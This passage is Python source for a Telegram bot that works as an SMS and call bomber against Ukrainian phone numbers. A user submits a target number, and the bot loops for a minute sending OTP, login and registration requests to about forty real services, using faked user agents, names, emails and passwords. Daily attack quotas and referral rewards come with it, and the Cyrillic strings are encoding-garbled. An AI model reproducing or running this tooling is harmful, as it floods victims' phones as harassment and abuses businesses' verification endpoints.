    # –ü–µ—Ä–µ—Å—á–∏—Ç—ã–≤–∞–µ–º –ª–∏–º–∏—Ç—ã –ø–µ—Ä–µ–¥ –ø–æ–∫–∞–∑–æ–º –æ—Å—Ç–∞—Ç–∫–∞ –∞—Ç–∞–∫
    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    # if not can_attack:
    #     await message.answer("–£ –≤–∞—Å –∑–∞–∫—ñ–Ω—á–∏–ª–∏—Å—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ. –°–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–≤—Ç—Ä–∞ –∞–±–æ –∑–∞–ø—Ä–æ—Å—ñ—Ç—å –¥—Ä—É–∑—ñ–≤ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∞—Ç–∞–∫!")
    #     return
    
    message_text = 'üéØ –ì–æ—Ç–æ–≤–∏–π –¥–æ –∞—Ç–∞–∫–∏!\n\nüí• –ù–∞–¥—ñ—à–ª—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É —É —Ñ–æ—Ä–º–∞—Ç—ñ +380–•–•–•–•–•–•–•–•–•'
    
    await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number, chat_id):
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    proxy = None
    proxy_auth = None

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å CSRF-—Ç–æ–∫–µ–Ω: {e}")
        return

    logging.info(f"–ü–æ–ª—É—á–µ–Ω CSRF-—Ç–æ–∫–µ–Ω: {csrf_token}")

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"

    logging.info(f"–ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–æ–º–µ—Ä {number}")

    async def send_request_and_log(url, **kwargs):
        try:
            if not attack_flags.get(chat_id):
                return
                
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.post(url, **kwargs) as response:
                    if response.status == 200:
                        logging.info(f"–£—Å–ø–µ—Ö - {number}")
        except asyncio.TimeoutError:
            logging.error(f"–¢–∞–π–º–∞—É—Ç –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ {url}")
        except aiohttp.ClientError as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ {url}: {e}")
        except Exception as e:
            logging.error(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ {url}: {e}")

    semaphore = asyncio.Semaphore(5)
    
    async def bounded_request(url, **kwargs):
        if not attack_flags.get(chat_id):
            return
        async with semaphore:
            await send_request_and_log(url, **kwargs)

    tasks = [
        bounded_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", json={"needSubscribeForNews": "false", "phone": formatted_number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", json={"phone": formatted_number, "type": ""}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://dnipro-m.ua/ru/phone-verification/", json={"phone": number}, headers=headers_dnipro, cookies=cookies_dnipro, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://my.ctrs.com.ua/api/v2/signup", json={"email": "finn889ik@gmail.com", "name": "–î–µ–Ω–∏—Å", "phone": number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://my.ctrs.com.ua/api/auth/login", json={"identity": "+" + number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://auth.easypay.ua/api/check", json={"phone": number}, headers=headers_easypay, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://sandalini.ua/ru/signup/", data={"data[firstname]": "–¥–µ–Ω—è", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://uvape.pro/index.php?route=account/register/add", data={"firstname": "–¥–µ–Ω—è", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, headers=headers_uvape, cookies=cookies_uvape, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4, "only_sms": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", data={"firstname": "–¥–µ–Ω—è", "lastname": "–¥–µ–Ω–µ–≤–∏—á", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, headers=headers_terravape,cookies=cookies_terravape, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://www.moyo.ua/identity/registration", data={"firstname": "–¥–µ–Ω—è", "phone": formatted_number5, "email": "rando@gmail.com"}, headers=headers_moyo, cookies=cookies_moyo, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://pizza.od.ua/ajax/reg.php", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", data={"phone": number[2:], "need_skeep": ""}, headers=headers_sushiya, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", data={"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", data={"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, headers=headers_zolota,cookies=cookies_zolota, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", data={"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "–¥–µ–Ω—è", "RegistrationForm[second_name]": "–¥–µ–Ω–µ–≤–∏—á", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, headers=headers_avtoria, cookies=cookies_avtoria, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", data={"phone": formatted_number6}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", data={"telephone": formatted_number7}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://api.iqos.com.ua/v1/auth/otp", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", method='POST', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://api-mobile.planetakino.ua/graphql", json={"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, headers=headers_elmir,cookies=cookies_elmir, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, headers=headers_elmir_call, cookies=cookies_elmir_call, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", json={"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth)
    ]

    if not attack_flags.get(chat_id):
        return
        
    for task in tasks:
        if not attack_flags.get(chat_id):
            return
        await task

async def start_attack(number, chat_id):
    global attack_flags
    attack_flags[chat_id] = True
    
    timeout = 60
    start_time = asyncio.get_event_loop().time()

    try:
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            if not attack_flags.get(chat_id):
                logging.info(f"–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä {number} –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
                await bot.send_message(chat_id, "üõë ¬°Alto! –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.")
                return
            
            await ukr(number, chat_id)
            
            if not attack_flags.get(chat_id):
                logging.info(f"–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä {number} –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
                await bot.send_message(chat_id, "üõë ¬°Alto! –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.")
                return
                
            await asyncio.sleep(0.1)
            
    except asyncio.CancelledError:
        await bot.send_message(chat_id, "üõë ¬°Alto! –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞.")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∞—Ç–∞–∫–∏: {e}")
        await bot.send_message(chat_id, "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∞—Ç–∞–∫–∏.")
    finally:
        attack_flags[chat_id] = False

    logging.info(f"–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä {number} –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
    
    async with db_pool.acquire() as conn:
        user_data = await conn.fetchrow(
            'SELECT attacks_left, promo_attacks, referral_attacks FROM users WHERE user_id = $1',
            chat_id
        )
    attacks_left = user_data['attacks_left'] if user_data else 0
    promo_attacks = user_data['promo_attacks'] if user_data else 0
    referral_attacks = user_data['referral_attacks'] if user_data and 'referral_attacks' in user_data else 0
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='üé™ –ö–∞–Ω–∞–ª', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    await bot.send_message(
        chat_id=chat_id,
        text=f"""üéâ ¬°Excelente! –ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä <i>{number}</i> –∑–∞–≤–µ—Ä—à–µ–Ω–∞!

üî• –°–ø–æ–¥–æ–±–∞–ª–∞—Å—å —Ä–æ–±–æ—Ç–∞ –±–æ—Ç–∞? 
–î–æ–ø–æ–º–æ–∂–∏ –Ω–∞–º –∑—Ä–æ—Å—Ç–∞—Ç–∏ ‚Äî –∑–∞–ø—Ä–æ—Å–∏ –¥—Ä—É–≥–∞!

üí¨ –Ø–∫—â–æ —î –ø–∏—Ç–∞–Ω–Ω—è –∞–±–æ –ø—Ä–æ–ø–æ–∑–∏—Ü—ñ—ó, –∑–≤–µ—Ä—Ç–∞–π—Å—è –¥–æ @ABOBA 

–ü—Ä–∏—î–¥–Ω—É–π—Å—è –¥–æ –Ω–∞—à–æ–≥–æ –∫–æ–º'—é–Ω—ñ—Ç—ñ üëá""",
        parse_mode="html",
        reply_markup=inline_keyboard2
    )

@dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –≥—Ä—É–ø
    
    # –Ü–≥–Ω–æ—Ä—É—î–º–æ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–æ–∫
    button_texts = ['üÜò –î–æ–ø–æ–º–æ–≥–∞', 'üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞', 'üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É']
    if message.text in button_texts:
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("–ü–æ–º–∏–ª–∫–∞: –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.")
        return

    if result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        async with db_pool.acquire() as conn:
            is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"–ù–æ–º–µ—Ä <i>{number}</i> –∑–∞—â–∏—â–µ–Ω –æ—Ç –∞—Ç–∞–∫–∏.", parse_mode="html")
            return

        can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
        total_attacks = attacks_left + promo_attacks + referral_attacks
        
        # if not can_attack:
        #     await message.answer(f"–£ –≤–∞—Å –∑–∞–∫—ñ–Ω—á–∏–ª–∏—Å—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ. –°–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–≤—Ç—Ä–∞!")
        #     return

        # –£–º–µ–Ω—å—à–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ—Å—Ç–∞–≤—à–∏—Ö—Å—è –∞—Ç–∞–∫ (—Å–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–º–æ, –ø–æ—Ç–æ–º –æ–±—ã—á–Ω—ã–µ)
        async with db_pool.acquire() as conn:
            if promo_attacks > 0:
                new_promo_attacks = promo_attacks - 1
                await conn.execute(
                    'UPDATE users SET promo_attacks = $1, last_attack_date = $2 WHERE user_id = $3',
                    new_promo_attacks, datetime.now(), user_id
                )
            elif referral_attacks > 0:
                new_referral_attacks = referral_attacks - 1
                await conn.execute(
                    'UPDATE users SET referral_attacks = $1, last_attack_date = $2 WHERE user_id = $3',
                    new_referral_attacks, datetime.now(), user_id
                )
            else:
                new_attacks_left = attacks_left - 1
                await conn.execute(
                    'UPDATE users SET attacks_left = $1, last_attack_date = $2 WHERE user_id = $3',
                    new_attacks_left, datetime.now(), user_id
                )

        # –ü–µ—Ä–µ—Å—á–∏—Ç—ã–≤–∞–µ–º –ª–∏–º–∏—Ç—ã –ø–æ—Å–ª–µ —Å–ø–∏—Å–∞–Ω–∏—è
        can_attack2, attacks_left2, promo_attacks2, referral_attacks2 = await check_attack_limits(user_id)
        new_total = attacks_left2 + promo_attacks2 + referral_attacks2
        cancel_keyboard = get_cancel_keyboard()
        attack_flags[chat_id] = True 
        await message.answer(f'üéØ –ú—ñ—Å—ñ—è —Ä–æ–∑–ø–æ—á–∞—Ç–∞!\n\nüì± –¶—ñ–ª—å: <i>{number}</i>\n\n‚ö° –°—Ç–∞—Ç—É—Å: –í –ø—Ä–æ—Ü–µ—Å—ñ...', parse_mode="html", reply_markup=get_cancel_keyboard())

        asyncio.create_task(start_attack(number, chat_id))
    else:
        await message.answer("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞.\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ.\n–ü—Ä–∏–º–µ—Ä: <i>üá∫üá¶380XXXXXXXXX</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    await callback_query.answer("–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º...")

async def check_attack_limits(user_id: int):
    today = datetime.now().date()
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow(
            "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date FROM users WHERE user_id = $1",
            user_id
        )
        
        if not result:
            return False, 0, 0, 0
        
        attacks_left = result['attacks_left']
        promo_attacks = result['promo_attacks']
        referral_attacks = result['referral_attacks']
        unused_referral_attacks = result['unused_referral_attacks']
        last_attack_date = result['last_attack_date']
        
        # –ü—Ä–∏–≤–æ–¥–∏–º last_attack_date –∫ –¥–∞—Ç–µ –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
        if last_attack_date:
            last_attack_date_only = last_attack_date.date()
        else:
            last_attack_date_only = today
        
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–∏–Ω—É—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–æ–≤–∏–π –¥–µ–Ω—å
        if last_attack_date_only != today:
            # –ó–±–µ—Ä—ñ–≥–∞—î–º–æ –Ω–µ–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ –∞—Ç–∞–∫–∏
            if referral_attacks > 0:
                unused_referral_attacks += referral_attacks
            # –°–∫–∏–¥–∞—î–º–æ –∑–≤–∏—á–∞–π–Ω—ñ –∞—Ç–∞–∫–∏ –Ω–∞ 3, –¥–æ–¥–∞—î–º–æ –Ω–∞–∫–æ–ø–∏—á–µ–Ω—ñ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ
            new_attacks = 3 + unused_referral_attacks
            await conn.execute(
                "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                new_attacks, today, user_id
            )
            attacks_left = new_attacks
            referral_attacks = 0
            unused_referral_attacks = 0
        
        total_attacks = attacks_left + promo_attacks + referral_attacks
        can_attack = total_attacks > 0
        
        return can_attack, attacks_left, promo_attacks, referral_attacks

async def user_exists(user_id: int) -> bool:
    """
    –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
    """
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT 1 FROM users WHERE user_id = $1', user_id)
    return result is not None

# –†–û–ó–´–ì–†–´–® VIP-–°–¢–ê–¢–£–°–ê

# –£–¥–∞–ª–∏—Ç—å —ç—Ç–æ—Ç –æ–±—Ä–∞–±–æ—Ç—á–∏–∫:
# @dp.message_handler(lambda message: message.chat.type in ['group', 'supergroup'] and message.text and f'@{bot._me.username}' in message.text if hasattr(bot, '_me') else False)

# –î–æ–±–∞–≤–∏—Ç—å –≤–º–µ—Å—Ç–æ –Ω–µ–≥–æ inline-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏:

@dp.inline_handler()
async def inline_giveaway(inline_query: types.InlineQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline-–∑–∞–ø—Ä–æ—Å–æ–≤ –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞"""
    user_id = inline_query.from_user.id
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ inline-–∑–∞–ø–∏—Ç –π–¥–µ –∑ –≥—Ä—É–ø–æ–≤–æ–≥–æ —á–∞—Ç—É
    # –Ø–∫—â–æ inline –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –æ—Å–æ–±–∏—Å—Ç–æ–º—É —á–∞—Ç—ñ - –Ω–µ –ø–æ–∫–∞–∑—É—î–º–æ —Ä–æ–∑—ñ–≥—Ä–∞—à
    if inline_query.chat_type not in ['group', 'supergroup']:
        results = [
            types.InlineQueryResultArticle(
                id='group_only',
                title='üé™ –¢—ñ–ª—å–∫–∏ –¥–ª—è –≥—Ä—É–ø',
                description='–†–æ–∑—ñ–≥—Ä–∞—à –¥–æ—Å—Ç—É–ø–Ω–∏–π —Ç—ñ–ª—å–∫–∏ –≤ –≥—Ä—É–ø–æ–≤–∏—Ö —á–∞—Ç–∞—Ö',
                input_message_content=types.InputTextMessageContent(
                    message_text='üé™ –†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É –¥–æ—Å—Ç—É–ø–Ω–∏–π –ª–∏—à–µ –≤ –≥—Ä—É–ø–æ–≤–∏—Ö —á–∞—Ç–∞—Ö!'
                )
            )
        ]
        await bot.answer_inline_query(inline_query.id, results, cache_time=1)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –ø—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
    if user_id not in ADMIN:
        # –î–ª—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—Ç–∫–∞–∑"
        results = [
            types.InlineQueryResultArticle(
                id='no_access',
                title='üé™ –ù–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É',
                description='–¢—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ',
                input_message_content=types.InputTextMessageContent(
                    message_text='üé™ –¢—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ!'
                )
            )
        ]
    else:
        # –î–ª—è –∞–¥–º–∏–Ω–æ–≤ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Ä–æ–∑—ã–≥—Ä—ã—à–∞
        results = [
            types.InlineQueryResultArticle(
                id='start_giveaway',
                title='üé™ –†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É',
                description='–í–∏–∑–Ω–∞—á–∏—Ç–∏ –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è —Å–µ—Ä–µ–¥ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤',
                input_message_content=types.InputTextMessageContent(
                    message_text='üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n–ì–æ—Ç–æ–≤–∏–π –æ–±—Ä–∞—Ç–∏ –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è —Å–µ—Ä–µ–¥ —É—Å—ñ—Ö –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –±–æ—Ç–∞!\n–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à üé≤',
                    parse_mode='HTML'
                ),
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("üé™ –í–∏–∑–Ω–∞—á–∏—Ç–∏ –ø–µ—Ä–µ–º–æ–∂—Ü—è", callback_data="start_giveaway")
                )
            )
        ]
    
    await bot.answer_inline_query(inline_query.id, results, cache_time=1)

@dp.callback_query_handler(lambda c: c.data == "start_giveaway")
async def start_giveaway(callback_query: types.CallbackQuery):
